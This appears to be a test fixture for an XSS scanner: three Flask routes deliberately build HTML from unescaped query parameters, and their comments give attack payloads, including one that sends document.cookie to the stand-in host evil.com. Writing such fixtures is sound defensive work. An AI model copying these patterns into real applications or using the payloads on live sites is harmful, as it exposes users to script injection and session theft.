# Fixture: py-flask-direct-return — Flask route returning f-string with user input
# Expected: TRUE POSITIVE (high confidence)
# CWE: CWE-79
# Agent: xss
# Pattern: Route handler returns HTML string built with user input, bypassing Jinja2 auto-escaping

from flask import Flask, request

app = Flask(__name__)


@app.route("/greet")
def greet():
    name = request.args.get("name", "World")
    # VULNERABLE: f-string return bypasses Jinja2 template engine entirely
    # Flask sets Content-Type: text/html by default for string returns
    # Attacker sends: ?name=<script>alert(document.cookie)</script>
    return f"<html><body><h1>Hello, {name}!</h1></body></html>"


@app.route("/error")
def error_page():
    code = request.args.get("code", "404")
    detail = request.args.get("detail", "Page not found")
    # VULNERABLE: string concatenation for HTML response
    # Attacker sends: ?detail=<img src=x onerror=alert(1)>
    return (
        "<html><body>"
        "<h2>Error " + code + "</h2>"
        "<p class='detail'>" + detail + "</p>"
        "</body></html>"
    )


@app.route("/api/preview")
def preview():
    title = request.args.get("title", "Untitled")
    content = request.args.get("content", "")
    # VULNERABLE: format() with user input returned as HTML
    # Attacker sends: ?content=<svg/onload=fetch('https://evil.com/'+document.cookie)>
    html = """
    <html>
    <head><title>{title}</title></head>
    <body>
        <article>
            <h1>{title}</h1>
            <div class="content">{content}</div>
        </article>
    </body>
    </html>
    """.format(title=title, content=content)
    return html
